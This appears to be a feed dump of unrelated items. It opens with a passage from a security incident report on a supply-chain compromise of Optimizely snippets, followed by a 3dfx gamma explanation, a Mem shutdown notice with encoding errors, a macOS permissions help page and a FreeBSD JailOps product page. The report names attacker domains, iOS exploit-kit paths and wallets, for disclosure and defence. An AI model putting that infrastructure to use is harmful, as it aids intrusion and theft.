On iPhones and iPads the script loads boot.js from 5vobauua3ojpklx.icu and eil786npto9u5bq.icu. It reads the iOS version and loads an exploit chain in a hidden iframe:

iOS version Chain 13 to 17 Coruna (/A8/, plus a direct Coruna loader at /JIUJIU888/index.js) 18.x DarkSword (/B9/, /D11/, /D12/) 26 Separate chain (/C10/); currently only fingerprints the device

The Coruna loader is byte-identical to a sample we analysed in October from a different campaign. The kit's own comments say iOS 18.7.3 and later, and 26.3 and later, are patched. Pages on iOS 18.6 or earlier reload every 60 seconds to retry the exploit, which is a visible symptom.

Money stolen so far

As of 19:25 UTC on 16 November, the attacker's wallets had received about $7,040, all within roughly nine hours on the 16th:

Wallet Received ≈ USD BTC 19g9rZcPeiz8rUvyWpTRyXXhPnjsWrc3kW 0.08298 BTC (4 tx), unspent $5,380 LTC ltc1q3wp7g6ds0ggg6fl6kncpa4sepn0q3qfacgred5 17.02 LTC (3 tx) $762 TRON THvs6p56XkUiMkJeSc51cAP64u2RsTYqxa 662.9 USDT + 184 TRX $719 ETH 0xC4026b06D82b0F0B363eda0642D61CfbDc17884e 0.055 ETH $100 BSC (same 0x address) 82 USDT $82

Funds were swept out at 13:03 to 13:05 UTC. The USDC on Ethereum went to a HitBTC deposit address. The TRON wallet has been in use since March 2026, so this actor was active long before this campaign. We cannot see how many cards or cookies reached 1688360.cc.

Who was affected

We fetched 1,611 distinct Optimizely snippets, found mostly through our own crawl data, and checked each one for the malicious code. 188 snippets belonging to 178 organisations were infected. We kept a copy of every infected file, along with its response headers, SHA-256 hash and fetch time as evidence. The real number is likely higher as we could only check snippets we could find in time.

How Report URI would have detected, or even prevented, this attack

Every one of these needs only a CSP in Report-Only mode, so nothing on the site breaks:

Product What it would have flagged Script Watch A new script dependency on your site: https://1688360.cc/track.js, followed by the .icu iOS routers. Data Watch New data destinations: 1688360.cc/hit.php and 1688360.cc/card.php. Frame Watch A new frame source: eil786npto9u5bq.icu, the exploit-kit iframe. CSP Integrity + JS Time Machine + Script Vault Your Optimizely snippet's fingerprint changing, plus a brand-new script with no matching known file. The JS Time Machine shows when the new version first appeared and how long it was served. Threat Intelligence Reports naming 5vobauua3ojpklx.icu and webshell.lol are already flagged as IoCs, as are 1688360.cc and the other hosts below once they were added.

It's possible to go even further and deploy a CSP that could actively block these attacks and prevent any data breach happening. The websites affected by this attack weren't necessarily running vulnerable code of their own, they were loading JavaScript from a provider they trusted, and that trust was exploited. This is why monitoring what runs in your visitors' browsers is so important. Report URI gives organisations the visibility to detect when trusted dependencies change or behave unexpectedly, and the tools to help enforce policies that prevent malicious scripts and connections from succeeding.

Did Content Security Policy help?

We crawled 256 of the affected organisations' own hosts and evaluated their CSP against what this payload needs:

Load track.js from 1688360.cc. Or run the inline fallback, which needs 'unsafe-eval' or 'unsafe-inline'. Send stolen data to 1688360.cc (connect-src). Load the iOS kit (script-src, frame-src). Result Organisations No CSP at all 68 CSP allowed the payload and the data theft 50 Payload ran, but connect-src blocked the data theft (the address swapping still worked) 17 Payload blocked 24 (15%)

Allowing cdn.optimizely.com was never going to help. The malicious code arrived from the trusted host itself. What separated the 24 protected sites from the rest was a restrictive script-src. A site that lists only the hosts it needs blocks 1688360.cc. Two common settings let it straight through:

'strict-dynamic': any script the trusted Optimizely snippet inserts is trusted too. 'unsafe-eval', which Optimizely's own documentation tells customers to allow: the inline-fallback version ran through eval even where track.js was blocked. That is what happened at HSBC. Its CSP blocked track.js and the data theft, but the inline copy still ran.

connect-src matters. The 17 "partial" sites blocked card, cookie and screenshot theft because they restrict where the page can send data. That doesn't stop address swapping, which happens inside the page.

What to do now

If your site uses Optimizely Web:

Open every project's Project JavaScript and every experiment's custom code. Look for 1688360.cc, atob( and any script you didn't write. Review who and what has write access to your Optimizely account (users, API tokens, integrations) and rotate credentials. If you have card fields in your own forms, treat cards entered on 16 November as potentially exposed. Treat any session tokens or secrets in non-HttpOnly cookies as exposed, and rotate them. Deploy a CSP. Restrict connect-src, avoid 'unsafe-eval' where you can, and turn on reporting. Consider if you need to communicate to your customers about having served them malware.

If you visited an affected site on 16 November:

Update your iPhone or iPad to iOS 18.7.3 or later, or iOS 26.3 or later. Check any crypto transfer you made. If the address you pasted doesn't match the one you meant to pay, it may have been swapped. Watch your card statements if you paid by card on an affected site. Indicators of compromise

All of these domains are attacker-owned; block them including subdomains.

During research and investigation, once we were confident that Optimizely was the source, we began efforts to reach out via various channels and provide the full details. item.title: Why 3dfx 1 cards had such a washed out color output?
item.description:
Both NeXT and 3DFX tried to “do the right thing” with color spaces, and it wound up generally making them look worse than competing options. I didn’t really understand it properly until years later. It is natural to think that a pixel with a value of 1.0 is emitting twice the photons as a pixel with a value of 0.5, so you can do the obvious linear math to calculate partial pixel coverage, blending a foreground over a background, or interpolating between colors in a texture. If displays are “linear”, that is correct. NeXT and 3DFX were much closer to linear than other contemporary displays. NeXT had crossover from the deep graphics understanding at Pixar, and 3DFX had the SGI heritage. They did this intentionally. If you have 10+ bits per channel like the professional rendering systems, linear displays are The Right Thing. Unfortunately, NeXTStation Colors were 4 bits per channel and 3DFX was 5 or 6 bits per channel, and there… it was not the right thing. Human eyes aren’t linear intensity sensors. We mostly register relative changes in intensity, so we can tell the difference between 0.01 and 0.02 as a huge doubling, while 0.99 to 1.00 is almost imperceptible. This distribution of intensities is often referred to as the “gamma” of the display system, but the actual curves like sRGB are a bit more complicated. If you only have a small number of discrete pixel values, you definitely don’t want to spread them evenly from 0 to 1! If you do, you will have good precision in the brights, but very stark “intensity bands” in the dark colors. If everything was authored specifically for 3DFX, you would still have the fundamental problem with the dark bands, but more accurate blending and filtering. The problem was that artists made all of their textures in paint programs on conventional non-linear displays, so when they were drawn by 3DFX cards, they got the characteristic “washed out color” look. You can mathematically correct textures for differences in display gamma, but I didn’t really understand the issue back in the glQuake days, and we were so enthralled by the absolute performance of 3DFX that the color fidelity didn’t get as much attention as it should have. Even today, tons of games don’t properly handle gamma across their textures and render targets. High resolutions and 24 bit color masks most of it, but you still see it in some slight shimmerings in high contrast textures and edges.

Does anybody know why 3DfX 1 cards had such a washed out color output? In my research, circa '97 I found many people complaining about the colors. Is it gamma? 16-bit color? What can it be?

item.title: Mem Is Shutting Down
item.description:
After a lot of thought, weâve made the difficult decision to bring Mem to a close. Mem will shut down on January 15, 2027.

Over the years, youâve trusted us with your ideas, meeting notes, unfinished drafts, and things you wanted to remember. Thank you for that trust. We know a notes app can become part of your daily life, and moving away from one takes time and care.

Our focus during these final weeks is helping you take your notes with you.

What happens next December 18, 2026: notes become read-only. You wonât be able to create or edit notes, but you can still read and export your existing notes. January 15, 2027: Mem shuts down. You wonât be able to access Mem after this date. Please download your notes beforehand.

You wonât be charged again. All charging has been paused. The paid features, functionality, and limits you previously paid for will be honored for the remainder of Memâs availability, with notes becoming read-only on December 18.

You donât need to choose your next app right away. Start by saving a copy of your library. Our migration guide walks you through that download and moving to Apple Notes, Notion, Google Docs, Obsidian, OneNote, and other apps. It also explains what to check afterward, including attachments, collections, and meeting transcripts.

A few moments weâll remember

We built Mem around a question: what if your notes could do more than sit in a folder? What if they could help you remember, make connections, and use what you already knew?

From catching a thought with a keyboard shortcut to finding connections, writing with AI, and having a conversation with your knowledge, each step grew out of that same question. These moments come from our original newsletters, product walkthroughs, and launch emails, with the interfaces and demos we shared along the way.

Catch a thought without breaking your flow

Mem Spotlight let you create a note from anywhere on your Mac with a keyboard shortcut. Capture first, get back to what you were doing, and find the thought waiting in your Timeline later. That small interaction captured a lot of what we wanted Mem to feel like.

 Finding notes in your own words

Search began understanding clues like dates, links, and people. You could ask for âmems that contain Twitter links from July 2021,â instead of remembering an exact title.

 Connections you didnât have to organize

Mem X used embeddings to find notes by meaning and surface related ideas. Similar Mems could bring back a thought youâd forgotten, without asking you to maintain a perfect filing system.

 AI writing that knew your context

Smart Write & Edit brought generative AI into your notes. It could help draft a message, prepare for a meeting, or develop an idea using the knowledge you had already saved.

 From tags to Collections

Collections grew out of the tags people were already using. Mem suggested relevant Collections as you wrote and found notes you might have forgotten to include. You could rename, merge, and organize them in bulk as your thinking changed.

 Letting new themes find their own home

The next step was helping you notice themes you hadnât named yet. When you wrote about something new, Mem could suggest a new Collectionânot just an existing one. You could accept it, change its name, or keep writing.

 A conversation with what you knew

With Mem Chat, your notes became something you could ask questions of. Our summer walkthrough showed how a simple question could surface a specific fact from your saved knowledge, with Smart Cards linking back to the notes behind an answer.

 A fresh start with Mem 2.0

We rebuilt Mem around dependable, offline-first capture and recall. Voice Mode turned spoken thoughts and meetings into notes, and a new Chrome extension made saving from the web easier. The two arrows in our new logo represented you and Mem thinking together.

 Meeting notes on autopilot

Mem could detect when you joined a call and offer to start taking notes with one click, without a bot joining the meeting. It also detected the end of the call, so you didnât have to remember to stop recording.

 Your notes, there when the conversation needed them

We introduced Heads Up Live and Meeting Briefings in beta for Mem Pro. One surfaced relevant context during a recorded meeting; the other helped you prepare before a calendar-linked meeting began.

 Bringing your notes into ChatGPT

The Mem app for ChatGPT brought your saved knowledge into another place you were already thinking and working. Alongside our MCP connector, it was another way to make your notes useful beyond Mem itself.

 An Agent that reached out first

Mem Agent arrived in iMessage, WhatsApp, email, and Slack. It connected the context in your notes with proactive follow-ups, bringing back a useful next step when it was time to act.

Behind each launch were people trying it, telling us where it fell short, and helping us make it better. The release posts record what we shipped. Your feedback shaped what those things became.

Thank you

To everyone who used Mem, shared it with a friend, sent us a thoughtful bug report, or trusted us with an idea before it was fully formed: thank you.

And to the team and the people who supported us along the way, thank you for the care you put into building this product.

Weâre proud of the ideas we explored together. More than anything, we want the work you put into Mem to remain useful to you wherever you go next.

Save your notes and find your next home for them â

â Kevin Founder and CEO

item.title: If an App Asks for Full Disk Access or System and App Protection Override
item.description:
If an app asks for Full Disk Access or System & App Protection Override on your Mac

Starting in macOS 27.3, when some apps ask for Full Disk Access or System & App Protection Override, you have the option to choose only specific protected folders or apps for the app to access. This puts you in control of what data is accessible to the app.

Why apps ask for these permissions

Apps that might ask for Full Disk Access or System & App Protection Override include backup apps, disk cleaners, file indexers, security apps, and others. While some of these apps operate best when granted broader access, others may ask for the same level of access even when they don't need it. It's important to understand the risks of granting broad access to any app, so you can make informed decisions about your own data and privacy.

When you give an app Full Disk Access instead of choosing only specific protected folders for it to access, it can bypass system protections and access all of the files on your Mac, including your messages, emails, photos and videos, data from other user accounts, and more. It can read, change, delete, and export this data without asking.

When you give an app System & App Protection Override, you can choose specific apps for it to control. If you allow it to bypass system protections instead, it can fully control your Mac and apps, which allows it to access all of your data. It can also see every window and app, including ones in the background, and capture every keystroke.

What you can do

An app might ask you to give it access to all of the files on your Mac, or to let it control your Mac. When you turn on access for the app in Privacy & Security settings, depending on the app, your Mac prompts you to:

Allow or not allow the app to have access. This option appears for some apps, such as backup apps that ask for Full Disk Access, and screen readers and voice control tools that ask for Accessibility.

Choose specific protected folders or apps for the app to access instead. This option appears for other apps that ask for Full Disk Access or System & App Protection Override. It allows the app to access only what you choose, while system protections stay in place for the rest of your data.

 If your Mac prompts you to choose specific protected folders or apps

To keep more of your data protected, choose specific protected folders or apps for the app to access instead of bypassing system protections.

Choose specific protected folders or apps

When your Mac prompts you, click Choose Folder or Choose Apps, then:

Check the app's setup instructions for information about which protected folders or apps it needs.

Choose only the protected folders or apps that it needs.

For System & App Protection Override, choose whether the app needs to ask for your permission before it controls each app. Use the menu next to each app to choose Ask First or At Any Time.

If you're not sure which protected folders or apps to choose, contact the app developer. To stay protected, wait until you're sure which folders or apps that the app needs before giving access.

You can change which protected folders or apps that the app can access at any time.

If you're certain that an app needs Full Disk Access or System & App Protection Override

Bypassing system protections might expose your personal information to an app that doesn't behave as you expect. An app with Full Disk Access can read, change, delete, and export all of the files on your Mac, and an app with System & App Protection Override can fully control your Mac and apps.

If you're certain that the app is from a trustworthy source and needs this level of access, you can give it Full Disk Access or System & App Protection Override permissions by clicking Bypass System Protections:

Confirm each action that the app will be able to take:

Full Disk Access: Read, Change, Delete, and Export All Your Data; View Hidden and Recently Deleted Photos; and Browse As You on Websites.

System & App Protection Override: Read, Change, Delete, and Export All Your Data; View Hidden and Recently Deleted Photos; Browse As You on Websites; Control Your Mac, Apps, and Settings; and Monitor Everything You Do.

If you're absolutely sure that you want to give the app Full Disk Access or System & App Protection Override, click Turn On Full Disk Access or Allow System & App Protection Override, then enter your password and click Modify Settings.

 Change or remove an app's access

You can review app permissions in Privacy & Security settings, and change or remove them at any time.

From the Apple menu, choose System Settings.

Click Privacy & Security in the sidebar, then click Files & Folders, Full Disk Access, or System & App Protection Override.

Change an app's access:

Remove an app's access: Select the app, then click the Remove button (−). If asked, enter your password, then click Modify Settings.

Change which protected folders or apps an app can access: In Files & Folders or System & App Protection Override, click the Info button (i) next to the app, make your changes, then click Done.

Limit an app with Full Disk Access or System & App Protection Override to specific protected folders or apps: Remove the app's access, then click the Add button (+) to add the app again. If your Mac prompts you, choose specific folders or apps.

If you remove an app's access, the app might not work as expected.

item.title: Run your FreeBSD services from one console
item.description:
Open source · ZFS-native · FreeBSD 15.1 and later

Run your FreeBSD services from one console.

Install apps in isolated jails, control who can reach them, and manage updates and recovery with ZFS. From the web console, the command line or the API.

FreeBSD jails, managed from one place. A jail is FreeBSD's own way to give a service a system of its own: its own files, users and network stack, on the host's kernel.

BSD 2-Clause license FreeBSD 15.1 and later, amd64 and arm64 No third-party tracking on this site Up and running in three commands Three commands

On a clean FreeBSD 15.1 machine, as root, once the package repository is trusted:

# pkg install jailops # jailops-setup -n # what it would do; changes nothing # jailops-setup

jailops-setup loads the kernel modules, sets up the pool, turns on forwarding, adds the one anchor line to pf.conf, starts jailopsd with the web console, runs jailops doctor and offers to create the first administrator. It ends with the console's address. Every action is printed before it runs, and running it again changes nothing. To run the host from the browser instead, see the appliance route.

What you get Backups that restore as a new jail and start with their data. A host firewall change you do not confirm undoes itself, so a mistake never locks you out. Encrypted volumes that stay shut until you unlock them, also after the machine has been off. Images that upgrade themselves overnight, and the jails that follow them move along. Every jail reachable on its own IPv6 address, straight from other hosts. Jails that find each other by name: db.shop.internal, or just db. Who it is for Hosting providers and agencies

One project per customer, and everything that is theirs stays theirs: network, storage, quotas, firewall and backups. Run hundreds of jails on one host, add a customer with a command, and give the tenant with the strictest demands a host of its own, managed the same way.

 A home lab

Your whole home server in jails: apps from the catalog with one command, WireGuard back home, and encrypted volumes that stay private when the machine is off.

 Teams and companies

One command line, one API and one console for every host. The fleet lives in git, the rules are the same everywhere, and backups go, encrypted, to hardware you choose.

 FreeBSD people

It is jail(8), ZFS and PF underneath: files you can read, no magic to unlearn, and a root helper that never trusts the daemon.

App catalog

Pick an app. Get a running service.

From the console or with one command. JailOps gives the app its own jail, installs it from the host's packages, checks that it answers and takes a snapshot. Eight apps to start with, among them isms and a DNS server.

Its own jailEvery app in a jail of its own, with its own network stack and its data on datasets of its own. Healthy, or not installedThe app's health check must pass before it counts as installed. A snapshot after installapp-installed: one command takes the jail back to the fresh installation. jailops app install nginx

Appliance

Run it like an appliance

The host and its firewall, the tunnels, who may reach each app, encrypted data and the logs of every jail, from the same CLI and console as your jails.

Host and firewall

Host name, resolvers, NTP and the host's own pf.conf. A firewall change reverts by itself unless you confirm it.

Changes that undo themselves Encrypted volumes

Native ZFS encryption and a passphrase only you know. After a boot the jail waits, locked, until you unlock it.

Encrypted at rest All logs in one place

jailops logs -f follows every jail at once. Forward the lines to syslog or a webhook, with no agent in the jails.

One stream of logs WireGuard

One command on the server, one on the other side. The keys are made on the host and kept by the root helper.

Connect networks App access

Every app starts closed. app allow opens it to one source and, for PostgreSQL, prints the connection string once.

Closed until you say so Everything labelled

Every interface JailOps makes says what it is in ifconfig, and the doctor checks it.

Read the labels What changes for you One command per jail

One command creates a jail from a ready image, with its addresses and firewall in place. A public IPv6 address for each one, on any cloud that gives you a /64.

IPv6 and cloud setups Recovery you can verify

Snapshots undo a bad change, but they live on the same pool. Off-host backups are encrypted on your host, go to a backup node that holds no key, and are checked by restoring them.

Snapshot, rollback, backup One host or fifty

The same CLI, API and console on every host. Projects keep teams apart: their names, quotas, networks and firewall policies (not the kernel, which every jail shares). Declare the fleet in git and let jailops-sync apply it.

Fleet examples From an empty host to a running jail

A network, a project, a jail, a snapshot and a dry-run upgrade on the command line. The same jail in the console. Demo data.

$ jailops network create web \ --ipv4 10.88.0.1/24 --nat \ --ipv6 2001:db8:1:2:1::1/80 --uplink vtnet0 network/web created $ jailops project create shop $ jailops network grant web --project shop $ jailops storage grant default --project shop $ jailops jail create site --project shop --image freebsd-15-1 \ --network web --storage default --memory 2G --autostart jail/site created $ jailops jail start site --project shop $ jailops jail list --project shop NAME STATE IMAGE GEN ADDRESSES AGE site running freebsd-15-1 freebsd-15-1#g1 10.88.0.2,2001:db8:1:2:1::2 8s $ jailops jail snapshot create site before-upgrade --project shop $ jailops jail upgrade site --project shop --dry-run dry-run: would upgrade jail site from freebsd-15-1#g1 to g2

From the field

Articles

Setups that work, and the details that make them work.

Jail updates without cron

Replace the nightly script that upgrades every jail: automatic jail upgrades per image, with a health check, a rollback and a record of every run, what they leave alone, and how a new FreeBSD release comes in.

Read the article: Jail updates without cron

Community

Build an app. Share it.

Every app in the catalog is one short YAML file. Make a FreeBSD service work in a jail on your own host, write it down, validate it, and send one pull request: once it is merged, every JailOps host gets it with its next pkg upgrade.

Start with the tutorial: memcached, from the package to the pull request.

Built the FreeBSD way Open source

BSD 2-Clause. Pure Go, single static binaries, an unprivileged daemon and a small root helper that does not trust it.

Why JailOps Closed by default

The API is on a local socket until you turn on the network listener or the console. That listener is TLS 1.3 only, with pinned certificates, scoped tokens or a sign-in.

Exposure Current FreeBSD

FreeBSD 15.1 and later, pkgbase first. Built by people who want to know FreeBSD to the bone.

Why FreeBSD Rather do it by hand?

That remains a fine choice. The FreeBSD base system has everything: jail.conf, zfs and pf. The recipes show the plain base-system commands first. JailOps uses the same mechanisms, writes files you can read, and can join a host you run by hand without taking over its pf.conf (route C).

Optional add-on

PkgOps: build, sign and ship FreeBSD packages

For people who build packages of their own: build and sign native FreeBSD packages from a laptop or CI, with no FreeBSD builder. You do not need it to run JailOps or to install apps from the catalog.

One CLI. One API. Every jail.

Your infrastructure. Your jail.

Three ways in: look at the console on demo data, install on a clean FreeBSD 15.1 machine, or add JailOps to a host you already run. Each ends with a service that answers.
